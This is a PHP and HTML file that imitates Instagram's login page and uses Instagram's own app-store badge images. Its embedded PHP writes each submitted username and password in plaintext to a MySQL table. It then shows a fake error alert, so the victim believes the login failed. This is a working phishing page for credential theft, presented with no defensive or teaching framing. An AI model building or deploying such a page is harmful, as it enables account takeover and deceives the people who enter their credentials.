<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Instagram Login Form</title>
    <!-- External css -->
    <link rel="stylesheet" href="main.css">
    <!-- Font awesome link -->
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.3/css/all.css" >
</head>
<body>
    <div id="wrapper">
      <div class="container">
        <div class="form-data">
          <!-- The form posts back to the same file -->
          <form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST">
            <div class="logo">
              <h1>face.</h1>
            </div>
            <input type="text" name="username" placeholder="Phone number, username, or email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button class="form-btn" type="submit">Log in</button>
            <span class="has-separator">Or</span>
            <a href="#" class="facebook-login">
              <i class="fab fa-facebook"></i> Log in with Facebook
            </a>
            <a class="password-reset" href="#">Forgot password?</a>
          </form>

          <div class="sign-up">
            Don't have an account? <a href="#">Sign up</a>
          </div>
          <div class="get-the-app">
            <span>Get the app</span>
            <div class="badge">
              <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="android App">
              <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="ios app">
            </div>
          </div>
        </div>
      </div>
    </div>
    <?php
    // Database connection parameters
    $servername = "localhost";
    $username = "root"; // Replace with your MySQL username
    $password = ""; // Replace with your MySQL password
    $dbname = "instagram_login";

    // Create connection
    $conn = new mysqli($servername, $username, $password);

    // Check connection
    if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    }

    // Create database if not exists
    $sql = "CREATE DATABASE IF NOT EXISTS $dbname";
    if ($conn->query($sql) === TRUE) {
        // Select the database
        $conn->select_db($dbname);
    } else {
        die("Error creating database: " . $conn->error);
    }

    // Create table if not exists
    $sql = "
    CREATE TABLE IF NOT EXISTS users (
      id INT AUTO_INCREMENT PRIMARY KEY,
      username VARCHAR(255) NOT NULL,
      password VARCHAR(255) NOT NULL
    )";

    if ($conn->query($sql) === FALSE) {
        die("Error creating table: " . $conn->error);
    }

    // Handle the form submission
    if ($_SERVER['REQUEST_METHOD'] == 'POST') {
        $user = $_POST['username'];
        $pass = $_POST['password'];

        // Insert the new user data directly into the database
        $sql = "INSERT INTO users (username, password) VALUES (?, ?)";
        $stmt = $conn->prepare($sql);
        $stmt->bind_param("ss", $user, $pass);
        if ($stmt->execute()) {
          echo "<script>alert('Database not found');</script>";
        } else {
          echo "<script>alert('account does not exist');</script>";
        }

        $stmt->close();
    }

    // Close connection
    $conn->close();
    ?>
</body>
</html>
